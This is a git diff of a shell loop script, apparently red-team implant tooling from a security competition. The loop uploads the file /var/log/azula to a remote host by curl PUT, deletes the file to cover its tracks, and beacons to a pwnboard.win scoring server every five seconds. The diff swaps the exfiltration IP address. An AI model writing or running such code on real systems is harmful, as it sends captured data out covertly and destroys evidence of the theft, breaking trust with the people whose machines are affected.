@@ -2,7 +2,7 @@
 
 while :
 do
-    curl -X PUT --upload-file /var/log/azula http://129.21.228.226:8000
+    curl -X PUT --upload-file /var/log/azula http://10.100.100.11:8000 2>&1 /dev/null
     rm /var/log/azula 2>&1 /dev/null
     sleep 5
 
@@ -10,4 +10,3 @@ do
     # Execute command
     curl -X POST -H "Content-Type: application/json" -d '{"ip":"$ip", "type":"sexypotat0"}' -s http://pwnboard.win/generic > /dev/null
 done
-System relod --> service to reload shit
